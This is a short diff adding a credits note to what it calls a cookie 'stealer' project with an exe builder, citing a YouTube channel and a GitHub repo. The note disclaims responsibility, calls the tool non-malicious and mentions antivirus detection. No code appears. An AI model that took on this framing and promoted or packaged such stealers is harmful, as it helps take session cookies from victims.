@@ -1,0 +1,8 @@
+100% credit to smthpy for making the stealer itself, his yt channel: https://www.youtube.com/@smthpy
+and his repo: https://github.com/something-0001/-s-Cookie-Grabber
+also this yt vid that helped me: https://www.youtube.com/watch?v=UZX5kH72Yx4
+all credits for coding the exe builder goes to pyinstaller and me
+this has nothing malicious and no dual-hooks.
+me or anyone else is not responsible for what you do with this experimental software.
+Note: Some anti-virus might still detect it.
+I will try my best to improve and update this as much as possible.
